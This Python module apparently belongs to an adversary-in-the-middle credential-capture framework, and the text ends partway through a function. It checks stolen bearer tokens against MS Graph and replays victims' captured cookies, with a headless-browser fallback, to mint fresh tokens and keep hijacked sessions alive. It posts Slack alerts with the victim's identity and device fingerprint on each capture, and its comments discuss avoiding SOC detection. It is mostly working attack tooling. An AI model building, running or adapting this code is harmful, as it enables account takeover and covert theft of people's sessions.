"""Token keep-alive monitor and Slack webhook notifications.

- Validates captured bearer tokens locally (JWT decode, expiry check)
- Tests tokens against MS Graph /me (enable_token_testing config, default on)
- Sends Slack notifications (enable_slack_notifications config, default on)
- Maintains a dedicated keepalive log (file + in-memory for dashboard)

OPSEC NOTE: External token testing and Slack notifications are disabled by
default. Testing captured tokens against MS Graph creates Azure AD sign-in
log entries visible to Blue Team SOC. Enable only in lab environments.
"""

import asyncio
import base64
import json
import logging
import logging.handlers
import os
import time
from collections import deque
from pathlib import Path
from urllib.parse import urlparse

import httpx

from backend.store import JsonStore
from backend.shared import append_log, get_config_value, notify_sites_changed, _push, mark_jwt_expired


def _token_testing_enabled() -> bool:
    return bool(get_config_value("enable_token_testing", True))


def _slack_enabled() -> bool:
    return bool(get_config_value("enable_slack_notifications", True))

credentials_store = JsonStore("credentials")
cookies_store = JsonStore("cookies")


# ── Dedicated Keep-Alive Log ─────────────────────────────

MAX_KEEPALIVE_LOG = 2000
_keepalive_log: deque[dict] = deque(maxlen=MAX_KEEPALIVE_LOG)
_file_logger: logging.Logger | None = None


def _get_keepalive_log_dir() -> Path:
    from backend.paths import data_dir
    d = data_dir() / "logs"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _ensure_file_logger():
    global _file_logger
    if _file_logger is not None:
        return
    log_path = _get_keepalive_log_dir() / "keepalive.log"
    _file_logger = logging.getLogger("mitm-proxy-keepalive")
    _file_logger.setLevel(logging.DEBUG)
    _file_logger.propagate = False
    handler = logging.handlers.RotatingFileHandler(
        str(log_path), maxBytes=25 * 1024 * 1024, backupCount=10, encoding="utf-8")
    handler.setFormatter(logging.Formatter(
        "%(asctime)s\t%(message)s", datefmt="%Y-%m-%d %H:%M:%S"))
    _file_logger.addHandler(handler)


def _ka_log(entry: dict):
    """Write a structured keep-alive log entry to memory + file + push to dashboard."""
    entry["ts"] = time.time()
    entry["time"] = time.strftime("%H:%M:%S")
    _keepalive_log.append(entry)
    # Write to dedicated file
    _ensure_file_logger()
    _file_logger.info(json.dumps(entry, default=str, separators=(",", ":")))
    # Push to dashboard
    _push({"type": "keepalive_log", "entry": entry})


def get_keepalive_log(last_n: int = 500, max_age_hours: int = 12) -> list[dict]:
    """Return keepalive log entries from the last max_age_hours."""
    cutoff = time.time() - (max_age_hours * 3600)
    entries = [e for e in _keepalive_log if e.get("ts", 0) >= cutoff]
    return entries[-last_n:]

# ── Slack Notifications ──────────────────────────────────

async def _post_slack(webhook_url: str, text: str) -> bool:
    """Post a message to a Slack incoming webhook. Returns True on success.

    Enabled by default. Toggle via Configuration → enable_slack_notifications.
    """
    if not _slack_enabled():
        return False
    if not webhook_url:
        return False
    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            resp = await client.post(webhook_url, json={"text": text})
            if resp.status_code != 200:
                append_log("warn", "slack",
                           f"Slack webhook returned {resp.status_code}: {resp.text[:200]}")
            return resp.status_code == 200
    except Exception as e:
        append_log("warn", "slack", f"Slack webhook failed: {e}")
        return False


UNKNOWN_USER = "unknown user"


def _get_user_name() -> str:
    """Get the current user identity from config (captured during login)."""
    return get_config_value("auto_login_email", "") or UNKNOWN_USER


def _get_webhook(config_key: str, env_key: str) -> str:
    """Get webhook URL from env var first, fall back to config."""
    return os.environ.get(env_key, "") or get_config_value(config_key, "")


def _route_webhook(default_url: str, who: str) -> str:
    """Pick which Slack channel a notification should land in.

    When the event is for an unidentified session (`auto_login_email`
    not set, so `who == UNKNOWN_USER`) and the operator has configured
    `slack_routine_webhook`, route there to keep the main channels free
    of low-signal noise. Otherwise return the default channel for the
    event type, preserving prior behavior when no routine webhook is
    configured.
    """
    if who == UNKNOWN_USER:
        routine = _get_webhook("slack_routine_webhook", "SLACK_ROUTINE_WEBHOOK")
        if routine:
            return routine
    return default_url


async def notify_slack_keepalive(site_id: str, hostname: str,
                                  valid: bool, detail: str = "",
                                  user: str = ""):
    """Send keep-alive status to the Slack keepalive channel."""
    who = user or _get_user_name()
    url = _route_webhook(
        _get_webhook("slack_keepalive_webhook", "SLACK_KEEPALIVE_WEBHOOK"),
        who,
    )
    if not url:
        return
    emoji = ":white_check_mark:" if valid else ":x:"
    status = "VALID" if valid else "EXPIRED"
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    text = f"{emoji} *[{hostname}]* Token {status} for *{who}* at {ts}"
    if detail:
        text += f"\n>{detail}"
    await _post_slack(url, text)


async def _notify_slack_failure(hostname: str, reason: str):
    """Send failure alert to BOTH Slack channels."""
    who = _get_user_name()
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    text = (f":rotating_light: *ALERT* - *{hostname}* for *{who}*\n"
            f">{reason}\n"
            f">Time: {ts}")
    # Send to both channels
    keepalive_url = _get_webhook("slack_keepalive_webhook", "SLACK_KEEPALIVE_WEBHOOK")
    capture_url = _get_webhook("slack_capture_webhook", "SLACK_CAPTURE_WEBHOOK")
    if keepalive_url:
        await _post_slack(keepalive_url, text)
    if capture_url and capture_url != keepalive_url:
        await _post_slack(capture_url, text)


async def notify_slack_capture(site_id: str, hostname: str,
                                token_count: int, cookie_count: int,
                                user: str = "", fingerprint: dict | None = None):
    """Send credential capture alert to the Slack capture channel."""
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    # Always log locally (anonymized — no user identity)
    append_log("info", "capture",
               f"Capture event: site={hostname} tokens={token_count} "
               f"cookies={cookie_count} at {ts}")
    who = user or _get_user_name()
    url = _route_webhook(
        _get_webhook("slack_capture_webhook", "SLACK_CAPTURE_WEBHOOK"),
        who,
    )
    if not url:
        return

    # Build fingerprint section if available
    fp_section = ""
    if fingerprint:
        screen = fingerprint.get("screen", {})
        screen_str = f"{screen.get('w')}×{screen.get('h')}" if screen.get('w') and screen.get('h') else "-"
        tz = fingerprint.get("timezone", "?")
        gpu = fingerprint.get("webgl", {}).get("vendor", "?")
        cores = fingerprint.get("hw_concurrency", "?")
        fp_id = (fingerprint.get("fingerprint_id") or "none")[:12]
        fp_conf = fingerprint.get("fingerprint_confidence", 0)
        platform = fingerprint.get("platform", "?")
        fp_section = (f"\n:fingerprint: *Device Fingerprint*\n"
                     f">ID: `{fp_id}` | Confidence: {fp_conf:.2f}\n"
                     f">Device: {platform} | {cores}-core {gpu} | {screen_str}\n"
                     f">Timezone: {tz}")

    text = (f":key: *New credentials captured* for *{who}* on *{hostname}*\n"
            f">Tokens: {token_count} | Cookies: {cookie_count}\n"
            f">Time: {ts}" + fp_section)
    await _post_slack(url, text)


async def notify_slack_login_start(site_id: str, hostname: str,
                                    login_url: str, user: str = ""):
    """Fire when a session first lands on a recognized login page."""
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    append_log("info", "capture",
               f"Login start: site={hostname} url={login_url[:200]} at {ts}")
    who = user or _get_user_name()
    url = _route_webhook(
        _get_webhook("slack_capture_webhook", "SLACK_CAPTURE_WEBHOOK"),
        who,
    )
    if not url:
        return
    text = (f":door: *Login attempt started* by *{who}* on *{hostname}*\n"
            f">URL: `{login_url[:200]}`\n"
            f">Time: {ts}")
    await _post_slack(url, text)


async def notify_slack_token(site_id: str, hostname: str, token_name: str,
                              token_len: int, user: str = ""):
    """Fire when a bearer / CSRF / session token is captured in flight."""
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    append_log("info", "capture",
               f"Token captured: site={hostname} name={token_name} "
               f"len={token_len} at {ts}")
    who = user or _get_user_name()
    url = _route_webhook(
        _get_webhook("slack_capture_webhook", "SLACK_CAPTURE_WEBHOOK"),
        who,
    )
    if not url:
        return
    text = (f":lock: *Flow token captured* for *{who}* on *{hostname}*\n"
            f">Header: `{token_name}`  ({token_len} chars)\n"
            f">Time: {ts}")
    await _post_slack(url, text)


# ── Token Testing ────────────────────────────────────────

def _find_best_token(data: dict) -> tuple[str | None, str | None]:
    """Find the best bearer token from credential data. Returns (token, source)."""
    ch = data.get("captured_headers", {})
    for name in ["Authorization: Bearer", "access_token", "accessToken"]:
        if name in ch:
            val = ch[name].get("value", "")
            if val:
                return val, name

    for tok in data.get("tokens", []):
        for field in ["access_token", "accessToken", "token"]:
            if field in tok and isinstance(tok[field], str) and tok[field]:
                return tok[field], f"tokens.{field}"

    return None, None


def _decode_jwt_payload(token: str) -> dict | None:
    """Decode a JWT payload without signature verification.

    Used for local token validation (expiry check) to avoid creating
    detection artifacts by calling MS Graph.
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        # JWT base64url decode (add padding)
        payload_b64 = parts[1]
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += "=" * padding
        payload = base64.urlsafe_b64decode(payload_b64)
        return json.loads(payload)
    except Exception:
        return None


async def _test_token(token: str, hostname: str = "",
                        site_id: str = "") -> dict:
    """Validate a bearer token.

    Remote Graph /me test when enable_token_testing is true (default),
    falling back to local JWT decode if it fails or is disabled.
    Remote testing creates Azure AD sign-in log entries visible to the SOC.
    """
    if _token_testing_enabled():
        return await _test_token_remote(token, hostname=hostname,
                                          site_id=site_id)
    return _test_token_local(token)


def _test_token_local(token: str) -> dict:
    """Validate token locally by decoding JWT and checking exp claim."""
    payload = _decode_jwt_payload(token)
    if payload is None:
        return {"valid": False, "error": "not a valid JWT", "method": "local"}

    exp = payload.get("exp", 0)
    if not isinstance(exp, (int, float)):
        return {"valid": False, "error": "no exp claim", "method": "local"}

    is_expired = exp < time.time()
    result = {
        "valid": not is_expired,
        "method": "local",
        "exp": exp,
        "expires_in": int(exp - time.time()),
    }
    upn = payload.get("upn") or payload.get("preferred_username") or payload.get("unique_name", "")
    if upn:
        result["user"] = upn
    return result


async def _test_token_remote(token: str, hostname: str = "",
                                site_id: str = "") -> dict:
    """Test a bearer token against MS Graph /me.

    WARNING: Creates Azure AD sign-in log entries visible to Blue Team SOC.
    Only use in lab environments.
    """
    t0 = time.time()
    url = "https://graph.microsoft.com/v1.0/me"
    req_headers_for_capture = {"Authorization": f"Bearer {token}"}
    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            resp = await client.get(
                url, headers={"Authorization": f"Bearer {token}"})
            valid = 200 <= resp.status_code < 300
            result = {"valid": valid, "status_code": resp.status_code,
                       "method": "remote",
                       "elapsed_ms": int((time.time() - t0) * 1000)}
            if valid:
                try:
                    body = resp.json()
                    result["user"] = body.get("displayName") or body.get("userPrincipalName", "")
                except Exception:
                    pass
            if hostname:
                _trace(hostname,
                        f"GRAPH /me -> {resp.status_code} in "
                        f"{result['elapsed_ms']}ms"
                        + (f" (user={result.get('user','')})"
                           if result.get('user') else ""))
            # Optional flow capture into the synthetic
            # keepalive_<site_id> session.
            try:
                from backend import keepalive_flow as _kaf
                if site_id and _kaf.is_enabled():
                    body_text = None
                    try:
                        body_text = resp.text[:64 * 1024]
                    except Exception:
                        pass
                    _kaf.append_http_round_trip(
                        site_id, hostname or site_id,
                        method="GET", url=url,
                        req_headers=req_headers_for_capture,
                        status=resp.status_code,
                        resp_headers=dict(resp.headers),
                        resp_body=body_text,
                        ts_req=t0, ts_resp=time.time())
            except Exception:
                pass
            return result
    except Exception as e:
        elapsed = int((time.time() - t0) * 1000)
        if hostname:
            _trace(hostname,
                    f"GRAPH /me FAILED in {elapsed}ms: "
                    f"{type(e).__name__}: {e}")
        try:
            from backend import keepalive_flow as _kaf
            if site_id and _kaf.is_enabled():
                _kaf.append_http_round_trip(
                    site_id, hostname or site_id,
                    method="GET", url=url,
                    req_headers=req_headers_for_capture,
                    status=None,
                    resp_headers={"x-error":
                                   f"{type(e).__name__}: {e}"[:200]},
                    ts_req=t0, ts_resp=time.time())
        except Exception:
            pass
        return {"valid": False, "error": str(e), "method": "remote",
                 "elapsed_ms": elapsed}


# ── Cookie Re-auth ───────────────────────────────────────

async def _attempt_cookie_reauth(site_id: str, data: dict) -> bool:
    """Replay captured cookies against the original URL to get a fresh token.

    Gated by enable_token_testing config (default on). Cookie replay from
    a different IP is a textbook credential theft indicator — keep this off
    in sensitive environments.
    """
    if not _token_testing_enabled():
        append_log("info", "keepalive",
                   f"[{site_id}] Cookie re-auth skipped (enable_token_testing=false)")
        return False
    cookies_list = data.get("cookies", [])
    source_url = data.get("current_url", "")
    if not cookies_list or not source_url:
        append_log("warn", "keepalive",
                   f"[{site_id}] Cannot re-auth: no cookies or URL")
        return False

    t0 = time.time()
    try:
        jar = httpx.Cookies()
        for c in cookies_list:
            if isinstance(c, dict) and "name" in c and "value" in c:
                try:
                    jar.set(c["name"], c["value"],
                            domain=c.get("domain", ""), path=c.get("path", "/"))
                except Exception:
                    pass

        _trace(site_id,
                f"REAUTH GET {source_url[:120]} cookies={len(cookies_list)}")
        async with httpx.AsyncClient(timeout=15.0, verify=False,
                                      cookies=jar, follow_redirects=True) as client:
            resp = await client.get(source_url)

            elapsed = int((time.time() - t0) * 1000)
            redirected = (str(resp.url) != source_url)
            _trace(site_id,
                    f"REAUTH -> {resp.status_code} in {elapsed}ms"
                    + (f" (redirected to {str(resp.url)[:120]})"
                       if redirected else ""))
            # Synthetic flow-trace capture (opt-in via
            # keepalive_flow_capture_enabled). The cookie-replay GET
            # is the most useful single round-trip to study post-hoc
            # — captures the redirect chain landing URL and any
            # response body so the operator can see why no token
            # came back.
            try:
                from backend import keepalive_flow as _kaf
                if _kaf.is_enabled():
                    body_text = None
                    try:
                        body_text = resp.text[:64 * 1024]
                    except Exception:
                        pass
                    host_for_cap = ""
                    try:
                        host_for_cap = (urlparse(source_url).hostname
                                         or site_id)
                    except Exception:
                        host_for_cap = site_id
                    req_hdrs = {f"Cookie [{c.get('name','')}]":
                                f"<redacted ({len(c.get('value','') or '')} chars)>"
                                for c in cookies_list[:30]
                                if isinstance(c, dict) and c.get("name")}
                    _kaf.append_http_round_trip(
                        site_id, host_for_cap,
                        method="GET", url=source_url,
                        req_headers=req_hdrs,
                        status=resp.status_code,
                        resp_headers=dict(resp.headers),
                        resp_body=body_text,
                        ts_req=t0, ts_resp=time.time())
            except Exception:
                pass

            # Check for token in response headers
            auth_header = resp.headers.get("authorization", "")
            if auth_header.lower().startswith("bearer "):
                new_token = auth_header[7:]
                _update_stored_token(site_id, data, new_token)
                _trace(site_id,
                        f"REAUTH found token in Authorization header "
                        f"(len={len(new_token)})")
                return True

            # Check response body for token JSON
            try:
                body = resp.json()
                if isinstance(body, dict):
                    for field in ["access_token", "accessToken", "token"]:
                        if field in body and isinstance(body[field], str):
                            _update_stored_token(site_id, data, body[field])
                            _trace(site_id,
                                    f"REAUTH found token in body.{field} "
                                    f"(len={len(body[field])})")
                            return True
            except Exception:
                pass

            _trace(site_id,
                    f"REAUTH no token found in response — "
                    f"replay only mints tokens via separate /token POST")
            append_log("info", "keepalive",
                       f"[{site_id}] Cookie replay got HTTP {resp.status_code}, no new token")
            # SPA fallback — when cookie-replay returns an HTML shell
            # the only path to a fresh token is to actually run the
            # SPA in a browser so MSAL's silent-renewal flow fires.
            # Gated by `keepalive_playwright_fallback_enabled` so it
            # doesn't spawn a Chromium context on every cycle unless
            # the operator wants it.
            from backend.shared import get_config_value as _cv
            if _cv("keepalive_playwright_fallback_enabled", False):
                from backend import keepalive_pw as _kpw
                pw_result = await _kpw.refresh_via_playwright(site_id, data)
                _trace(site_id,
                        f"PW_FALLBACK source={pw_result.get('source')} "
                        f"elapsed={pw_result.get('elapsed_ms')}ms "
                        f"ok={pw_result.get('ok')}")
                if pw_result.get("ok") and pw_result.get("new_token"):
                    _update_stored_token(site_id, data,
                                          pw_result["new_token"])
                    append_log("info", "keepalive",
                               f"[{site_id}] Cookie replay returned HTML "
                               f"shell — Playwright silent-refresh got a "
                               f"new token ({pw_result.get('source')}, "
                               f"{pw_result.get('elapsed_ms')}ms)")
                    return True
            return False

    except Exception as e:
        elapsed = int((time.time() - t0) * 1000)
        _trace(site_id, f"REAUTH error in {elapsed}ms: {type(e).__name__}: {e}")
        append_log("warn", "keepalive", f"[{site_id}] Cookie re-auth error: {e}")
        return False


async def diagnose_site(site_id: str, *,
                         include_remote: bool = False,
                         include_reauth: bool = False) -> dict:
    """Diagnose a single keep-alive site. Defaults to a fast,
    network-free pass: decodes the stored JWT, summarises captured
    state (cookies / age / current_url), and runs the local exp
    check. Sub-second.

    Pass `include_remote=True` to also run the Graph /me check
    (3-15 s upstream HTTP). Pass `include_reauth=True` to also run
    the cookie-replay GET (3-15 s, can hang on dead targets). The
    UI exposes these as opt-in toggles in the result panel so the
    first click is always cheap.

    Returns:
        {
          ok: bool,
          site_id, hostname,
          token: {present, source, length, exp, expires_in, expired,
                  decoded_claims},
          local_check: {valid, expires_in, error},
          remote_check: {status_code, valid, body_snippet, error},
          captured_state: {cookies_count, has_refresh_token,
                           has_id_token, captured_at, age_seconds,
                           url, current_url},
          reauth: {attempted, cookies_sent, target_url,
                   response_status, response_url, response_headers,
                   body_snippet, found_token, new_token_len,
                   new_token_source, error},
          recommendations: [str, …],
        }
    """
    out: dict = {"ok": False, "site_id": site_id,
                  "hostname": "", "recommendations": []}
    data = credentials_store.get(site_id)
    if not data:
        out["error"] = f"no credentials stored for {site_id}"
        return out
    current_url = data.get("current_url") or ""
    try:
        out["hostname"] = (urlparse(current_url).hostname
                            or site_id.replace("_", "."))
    except Exception:
        out["hostname"] = site_id.replace("_", ".")

    token, source = _find_best_token(data)
    tok_info: dict = {"present": bool(token), "source": source or ""}
    if token:
        tok_info["length"] = len(token)
        decoded = _decode_jwt_payload(token) or {}
        # Surface only safe-to-render claims; never echo the raw token.
        tok_info["decoded_claims"] = {
            k: decoded.get(k) for k in (
                "aud", "iss", "sub", "upn", "preferred_username",
                "email", "tid", "oid", "appid", "azp", "scp",
                "scope", "amr", "iat", "nbf", "exp")
            if decoded.get(k) is not None
        }
        exp = decoded.get("exp")
        if isinstance(exp, (int, float)):
            tok_info["exp"] = int(exp)
            tok_info["expires_in"] = int(exp - time.time())
            tok_info["expired"] = tok_info["expires_in"] <= 0
    out["token"] = tok_info

    cookies = data.get("cookies") or []
    captured_at = data.get("captured_at") or 0
    out["captured_state"] = {
        "cookies_count": len(cookies),
        "cookie_names": [c.get("name", "") for c in cookies if isinstance(c, dict)][:30],
        "has_refresh_token": any(
            "refresh" in (c.get("name") or "").lower() for c in cookies
            if isinstance(c, dict)),
        "has_id_token": any(t.get("id_token") for t in
                              (data.get("tokens") or [])
                              if isinstance(t, dict)),
        "captured_at": captured_at,
        "age_seconds": int(time.time() - captured_at) if captured_at else None,
        "current_url": current_url,
    }

    # Local validity check
    local = {}
    if token:
        try:
            local = _test_token_local(token)
        except Exception as e:
            local = {"error": f"local check raised: {e}"}
    out["local_check"] = local

    # Remote /me check — opt-in via include_remote (3-15s upstream).
    remote: dict = {"skipped": True}
    if include_remote and token and local.get("valid"):
        try:
            remote_full = await _test_token_remote(token)
            remote = {
                "valid": remote_full.get("valid"),
                "status_code": remote_full.get("status_code"),
                "user": remote_full.get("user"),
                "error": remote_full.get("error"),
            }
        except Exception as e:
            remote = {"error": f"remote check raised: {e}"}
    out["remote_check"] = remote

    # Re-auth trace — opt-in via include_reauth (3-15s upstream).
    # When we DO run it, the result reveals why cookie replay isn't
    # producing a fresh token; this is the 45-min mystery box.
    reauth: dict = {"attempted": False}
    if not include_reauth:
        reauth["skipped_reason"] = ("not requested — re-run with the "
                                     "Run reauth trace toggle")
    elif not _token_testing_enabled():
        reauth["skipped_reason"] = ("enable_token_testing is off — "
                                     "cookie replay disabled")
    elif not cookies:
        reauth["skipped_reason"] = "no cookies stored"
    elif not current_url:
        reauth["skipped_reason"] = "no current_url stored"
    else:
        reauth["attempted"] = True
        reauth["target_url"] = current_url
        reauth["cookies_sent"] = len(cookies)
        try:
            jar = httpx.Cookies()
            for c in cookies:
                if isinstance(c, dict) and "name" in c and "value" in c:
                    try:
                        jar.set(c["name"], c["value"],
                                domain=c.get("domain", ""),
                                path=c.get("path", "/"))
                    except Exception:
                        pass
            async with httpx.AsyncClient(timeout=15.0, verify=False,
                                          cookies=jar,
                                          follow_redirects=True) as client:
                resp = await client.get(current_url)
            reauth["response_status"] = resp.status_code
            reauth["response_url"] = str(resp.url)
            reauth["response_headers"] = {
                k: v for k, v in resp.headers.items()
                if k.lower() in (
                    "content-type", "location", "www-authenticate",
                    "set-cookie", "x-ms-request-id",
                    "x-ms-diagnostics", "authorization")}
            body_text = resp.text or ""
            reauth["body_snippet"] = body_text[:1500]
            # Try to find a token using the same logic as the real
            # _attempt_cookie_reauth, but report what we looked for.
            ah = resp.headers.get("authorization", "")
            if ah.lower().startswith("bearer "):
                reauth["found_token"] = "Authorization: Bearer"
                reauth["new_token_len"] = len(ah[7:])
                reauth["new_token_source"] = "response header"
            else:
                try:
                    body = resp.json()
                    found = ""
                    for field in ("access_token", "accessToken",
                                  "token", "id_token", "idToken"):
                        if isinstance(body, dict) and isinstance(
                                body.get(field), str) and body[field]:
                            found = field
                            reauth["new_token_len"] = len(body[field])
                            break
                    if found:
                        reauth["found_token"] = f"body.{found}"
                        reauth["new_token_source"] = "JSON body"
                    else:
                        reauth["found_token"] = ""
                except Exception:
                    reauth["found_token"] = ""
                    reauth["body_parse_error"] = (
                        "response not JSON — token can only be picked "
                        "up from a Bearer header here")
        except Exception as e:
            reauth["error"] = f"{type(e).__name__}: {e}"
    out["reauth"] = reauth

    # Synthesise actionable hints from what we observed.
    rec = out["recommendations"]
    if tok_info.get("expired"):
        rec.append(
            "Access token is already expired. Cookie re-auth would "
            "need to produce a NEW Bearer or access_token. If "
            "reauth.found_token is empty, the captured cookies don't "
            "drive an in-band token issuance for this site — check "
            "current_url (it should be a token endpoint or an XHR "
            "that responds with a token, not a generic landing page).")
    if (not tok_info.get("present")) and reauth.get("attempted"):
        rec.append(
            "No stored token but cookies exist. Re-auth is the only "
            "path; check `reauth.body_snippet` for an HTML login "
            "page (means cookies have expired too).")
    if (out["captured_state"]["age_seconds"] or 0) > 45 * 60 \
            and not tok_info.get("expired") is False:
        rec.append(
            "Captured state is older than 45 minutes — typical AAD "
            "access token lifetime. If you're not seeing fresh tokens "
            "in subsequent flow rows, the application is using a "
            "long-lived session cookie + on-demand /token POSTs that "
            "cookie replay alone won't trigger. Use the dedicated "
            "Playwright fallback (Settings → Keep-Alive → "
            "<code>keepalive_playwright_fallback_enabled</code>) or "
            "the \"Try Playwright refresh\" button below.")
    # When the token is expired and the operator skipped the slow
    # reauth probe, still suggest the right next step instead of
    # leaving the panel silent.
    if tok_info.get("expired") and not reauth.get("attempted"):
        rec.append(
            "Re-auth wasn't attempted on this fast pass. Either "
            "click \"Run reauth trace\" to see what cookie replay "
            "returns, or jump straight to \"Try Playwright refresh\" "
            "below — it spins the SPA in a real browser and captures "
            "whatever token MSAL silent-renewal mints.")
    if reauth.get("attempted") and reauth.get("response_status") \
            and reauth["response_status"] >= 400:
        rec.append(
            f"Cookie-replay GET returned {reauth['response_status']} — "
            f"cookies may have expired or the destination requires "
            f"step-up auth. Check `reauth.response_headers` for "
            f"`WWW-Authenticate` / `Location`.")
    if reauth.get("attempted") and reauth.get("response_status") \
            and 200 <= reauth["response_status"] < 300 \
            and not reauth.get("found_token"):
        # Detect the SPA-shell pattern (HTML response, no token).
        # Point the operator straight at the dedicated-Playwright
        # fallback feature that solves this exact case.
        body_snippet = (reauth.get("body_snippet") or "").lower()
        is_spa_shell = (
            "<!doctype html" in body_snippet
            and ("<div id=\"root\"" in body_snippet
                 or "<div id='root'" in body_snippet
                 or "<noscript>" in body_snippet))
        pw_enabled = bool(get_config_value(
            "keepalive_playwright_fallback_enabled", False))
        if is_spa_shell:
            if pw_enabled:
                rec.append(
                    "Cookie-replay returned an SPA HTML shell — the "
                    "site mints tokens via in-page MSAL silent renewal, "
                    "not on the cookie GET. The dedicated-Playwright "
                    "fallback IS enabled, so the next cycle should "
                    "drive a real refresh; click \"Try Playwright "
                    "refresh\" below to fire it now.")
            else:
                rec.append(
                    "Cookie-replay returned an SPA HTML shell — the "
                    "site mints tokens via in-page MSAL silent "
                    "renewal, not on the cookie GET. Enable "
                    "<code>keepalive_playwright_fallback_enabled</code> "
                    "in Settings → Keep-Alive to drive the refresh in "
                    "a dedicated headless Chromium, OR click \"Try "
                    "Playwright refresh\" below to test it ad-hoc.")
        else:
            rec.append(
                "Cookie-replay returned 200 but no new token was found "
                "in headers or JSON body. The app probably mints "
                "tokens via a separate /token POST (which the cookie "
                "GET does not trigger). Try the Playwright refresh "
                "below — that runs the SPA in a real browser so its "
                "in-page token rotation can drive the refresh.")
    if not tok_info.get("present"):
        rec.append(
            "No stored token at all. Capture a fresh login through "
            ":8091 or :3128 first.")

    out["history"] = get_site_history(site_id)
    out["failure_state"] = get_site_failure_state(site_id)
    out["ok"] = True
    return out


def _update_stored_token(site_id: str, data: dict, new_token: str):
    """Update the stored bearer token with a freshly obtained one."""
    if "captured_headers" not in data:
        data["captured_headers"] = {}
    data["captured_headers"]["Authorization: Bearer"] = {
        "value": new_token,
        "source": "keepalive_reauth",
        "captured_at": time.time(),
    }
    # Also add to tokens array
    data.setdefault("tokens", []).append({
        "access_token": new_token,
        "source_url": "keepalive_reauth",
        "captured_at": time.time(),
    })
    credentials_store.put(site_id, data)
    notify_sites_changed()
    append_log("info", "keepalive",
               f"[{site_id}] Token refreshed via cookie replay, len={len(new_token)}")


# ── Keep-Alive Background Task ───────────────────────────

_keepalive_task: asyncio.Task | None = None
_last_run: float = 0
_last_results: dict = {}

# Per-site rolling snapshot history. Each cycle appends a small record
# (no upstream HTTP) so a Debug click later can see the lifetime curve
# even if nobody was watching when the 45-min expiry happened.
# Keyed by site_id; deque maxlen 50 ≈ ~4 hours at default 5-min cadence.
from collections import deque as _deque
_site_history: dict[str, "_deque[dict]"] = {}
_SITE_HISTORY_MAX = 50

# Per-site failure tracking. Keep-alive pauses a site after N
# consecutive failed cycles so we stop hammering Graph + the cookie-
# replay endpoint and stop spamming Slack with the same alert every
# 5 minutes. Operator resumes via the Debug button (or a successful
# manual re-auth — either zeroes the counter).
_site_failures: dict[str, dict] = {}


def _failure_threshold() -> int:
    try:
        return max(1, int(get_config_value(
            "keepalive_max_consecutive_failures", 2)))
    except Exception:
        return 2


def is_site_paused(site_id: str) -> bool:
    return bool((_site_failures.get(site_id) or {}).get("paused"))


def get_site_failure_state(site_id: str) -> dict:
    """Read-only view of a site's failure counter / paused flag.
    Returned by diagnose_site() so the UI can render it."""
    rec = _site_failures.get(site_id) or {}
    return {
        "consecutive_failures": rec.get("consecutive_failures", 0),
        "paused": bool(rec.get("paused")),
        "paused_at": rec.get("paused_at"),
        "paused_reason": rec.get("paused_reason", ""),
    }


async def pw_refresh_now(site_id: str) -> dict:
    """Run the dedicated-Playwright SPA refresh on demand for one
    site. Bypasses the `keepalive_playwright_fallback_enabled`
    config gate (the operator clicked the button). On success
    persists the new token into credentials_store and resets the
    failure counter.

    Returns the same dict shape as `keepalive_pw.refresh_via_playwright`
    plus a `persisted` flag indicating whether the token landed in
    credentials_store."""
    data = credentials_store.get(site_id)
    if not data:
        return {"ok": False, "error": f"no credentials for {site_id}",
                "persisted": False}
    try:
        from backend import keepalive_pw as _kpw
        result = await _kpw.refresh_via_playwright(site_id, data)
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}",
                "persisted": False}
    persisted = False
    if result.get("ok") and result.get("new_token"):
        try:
            _update_stored_token(site_id, data, result["new_token"])
            _record_success(site_id)
            persisted = True
        except Exception as e:
            result["persist_error"] = f"{type(e).__name__}: {e}"
    return {**result, "persisted": persisted}


def resume_site(site_id: str) -> bool:
    """Clear the paused / failure state for a site. Called by the
    Debug-panel Resume button and on a successful manual re-auth."""
    rec = _site_failures.get(site_id)
    if not rec:
        return False
    if rec.get("paused"):
        append_log("info", "keepalive",
                   f"[{site_id}] Resumed by operator — keep-alive will "
                   f"check this site again on the next cycle.")
    _site_failures.pop(site_id, None)
    return True


def _record_success(site_id: str) -> None:
    """Reset the failure counter on any successful cycle so transient
    failures don't accumulate forever."""
    if site_id in _site_failures:
        _site_failures.pop(site_id, None)


def _record_failure(site_id: str, hostname: str,
                     reason: str) -> tuple[int, bool]:
    """Increment the failure counter for a site. Returns
    (consec_failures, just_paused). When `just_paused` is True the
    caller should emit the single transition Slack/log line; when
    False it should stay quiet (the recurring-noise that prompted
    this feature)."""
    rec = _site_failures.setdefault(site_id, {
        "consecutive_failures": 0,
        "paused": False,
        "paused_at": None,
        "paused_reason": "",
    })
    if rec["paused"]:
        return rec["consecutive_failures"], False
    rec["consecutive_failures"] += 1
    threshold = _failure_threshold()
    if rec["consecutive_failures"] >= threshold:
        rec["paused"] = True
        rec["paused_at"] = time.time()
        rec["paused_reason"] = reason
        append_log("warn", "keepalive",
                   f"[{hostname}] PAUSED after "
                   f"{rec['consecutive_failures']} consecutive "
                   f"failures ({reason}). Skipping until manually "
                   f"resumed via Debug → Resume.")
        return rec["consecutive_failures"], True
    return rec["consecutive_failures"], False


def _snapshot_site(site_id: str, data: dict, token: str | None,
                    source: str, valid: bool | None,
                    http_status: int | str | None) -> None:
    """Append a fast snapshot of a site's keep-alive state to its
    rolling history. Called from the cycle loop after `_test_token`
    returns. Pure in-memory + JWT decode — no network."""
    snap: dict = {
        "ts": time.time(),
        "valid": valid,
        "http": http_status,
        "source": source or "",
    }
    if token:
        snap["token_len"] = len(token)
        decoded = _decode_jwt_payload(token) or {}
        exp = decoded.get("exp")
        if isinstance(exp, (int, float)):
            snap["exp"] = int(exp)
            snap["expires_in"] = int(exp - time.time())
            snap["expired"] = snap["expires_in"] <= 0
        # Tiny claim summary — useful for spotting aud/scp drift.
        for k in ("aud", "tid", "appid", "azp", "scp", "scope"):
            v = decoded.get(k)
            if v not in (None, ""):
                snap[k] = (v if not isinstance(v, list)
                           else ",".join(str(x) for x in v[:3]))
